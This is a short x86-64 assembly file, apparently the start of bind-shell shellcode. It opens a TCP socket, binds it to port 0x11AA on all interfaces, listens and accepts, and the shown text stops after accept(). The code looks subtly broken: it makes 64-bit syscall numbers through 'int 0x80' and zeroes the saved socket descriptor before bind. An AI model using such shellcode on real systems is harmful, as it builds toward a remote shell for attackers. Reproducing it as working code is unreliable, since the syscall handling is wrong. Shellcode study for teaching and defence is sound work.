BITS 64

; socket()
xor		rax,rax		; zero out eax
xor		rdi,rdi
xor		rsi,rsi
xor		rdx,rdx
mov		dil,0x2		; AF_INET
mov		sil,0x1		; SOCK_STREAM
mov		al,0x29		; socket() syscall
int		0x80		; let the kernel do the stuff

mov		rdi,rax		; save sockfd (used as argument for future calls)

; bind()
xor		rax,rax
xor		rdi,rdi
xor		rsi,rsi
push		rax		; sockaddr_in: in_addr = 0
push word	0x11AA		; sockaddr_in: tcp port
push word	0x2		; sockaddr_in: sa_family = AF_INET
mov		rsi,rsp		; save stack pointer (pointer to struct sockaddr_in)
mov		rdx,0x10	; addrlen
mov		al,0x31		; bind() syscall
int		0x80		; kernel mode

; listen()
xor		rax,rax
xor		rsi,rsi		; zero rsi (arg2 -> backlog)
mov		al,0x32		; listen() syscall
int		0x80

; accept()
xor		rax,rax
push		rax		; sockaddr_in: in_addr = 0
push word	ax		; sockaddr_in: tcp_port = 0
push word	0x2		; sockaddr_in: sa_family = AF_INET
mov		rsi,rsp		; save stack pointer (pointer to struct sockaddr_in)
mov		al,0x2B		; accept() syscall
int		0x80

